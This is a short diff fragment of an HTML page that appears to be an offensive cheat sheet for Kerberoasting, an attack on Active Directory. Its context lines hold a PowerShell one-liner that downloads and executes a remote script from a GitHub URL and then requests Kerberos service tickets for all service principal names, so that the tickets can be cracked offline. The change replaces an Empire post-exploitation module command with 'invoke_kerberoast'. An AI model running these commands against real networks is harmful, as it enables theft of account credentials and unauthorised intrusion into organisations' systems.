@@ -27,5 +27,4 @@ Just Users<br/>
 &nbsp;&#09;IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}<br/>
 <br/>
 Empire<br/>
-usemodule credentials/get_spn_tickets<br/>
-run</body></html>
+invoke_kerberoast</body></html>
